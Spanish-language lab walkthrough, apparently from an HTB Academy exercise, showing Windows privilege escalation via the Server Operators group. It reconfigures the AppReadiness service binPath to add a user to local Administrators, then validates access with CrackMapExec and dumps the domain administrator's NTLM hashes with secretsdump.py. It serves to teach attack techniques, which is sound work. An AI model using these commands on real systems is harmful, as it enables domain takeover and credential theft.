
# 🧠 Escalada de Privilegios en Windows - Server Operators

## 👥 ¿Qué es el grupo Server Operators?

El grupo **Server Operators** permite a sus miembros administrar servidores Windows **sin ser Domain Admins**. Es un grupo altamente privilegiado que puede:

- Iniciar sesión localmente en servidores, incluyendo **Controladores de Dominio**
- Administrar servicios locales
- Posee los privilegios `SeBackupPrivilege` y `SeRestorePrivilege`

---

## 🔍 Consultando el servicio AppReadiness

Podemos verificar que el servicio **AppReadiness** se ejecuta como **SYSTEM** usando la utilidad `sc.exe`:

```cmd
sc qc AppReadiness
```

Resultado:

```
SERVICE_START_NAME : LocalSystem
```

Esto confirma que el servicio corre con la cuenta **SYSTEM** (`NT AUTHORITY\SYSTEM`).

---

## 🔐 Comprobando permisos del servicio con PsService

Podemos usar **PsService** de Sysinternals para ver los permisos del servicio:

```cmd
c:\Tools\PsService.exe security AppReadiness
```

Salida:

```
[ALLOW] BUILTIN\Server Operators
        All
```

✅ Esto confirma que los miembros del grupo **Server Operators** tienen **SERVICE_ALL_ACCESS**, lo que permite **control total** sobre el servicio: iniciar, detener, modificar, etc.

---

## 🚫 Verificando miembros del grupo Administrators

```cmd
net localgroup Administrators
```

Salida:

```
Miembros:
Administrator
Domain Admins
Enterprise Admins
```

El usuario `server_adm` **no está presente aún**.

---

## 🛠️ Modificando la ruta binaria del servicio

Podemos cambiar la ruta del ejecutable del servicio para ejecutar un comando que **añada nuestro usuario al grupo de administradores locales**:

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Resultado:

```
[SC] ChangeServiceConfig SUCCESS
```

---

## 🚫 Intento de iniciar el servicio

Al intentar iniciar el servicio:

```cmd
sc start AppReadiness
```

Se obtiene:

```
[SC] StartService FAILED 1053
```

Esto es **esperado**, ya que el servicio no es válido tras la modificación, pero **el comando sí se ejecuta**.

---

## ✅ Verificando que somos administradores

```cmd
net localgroup Administrators
```

Ahora aparece:

```
Miembros:
Administrator
Domain Admins
Enterprise Admins
server_adm
```

¡Éxito! Hemos añadido nuestro usuario al grupo de administradores locales.

---

## 🧠 Confirmando acceso como administrador en el controlador de dominio

Desde este punto, podemos usar herramientas como **CrackMapExec** para interactuar con el DC:

```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

Resultado:

```
[+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

---

## 🔐 Extrayendo hashes NTLM del controlador de dominio

```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

Ejemplo de salida:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Administrator:aes256-cts-hmac-sha1-96:...
```

✅ Hemos obtenido los **hashes NTLM** del administrador del dominio, lo que nos da control total sobre el entorno.

---
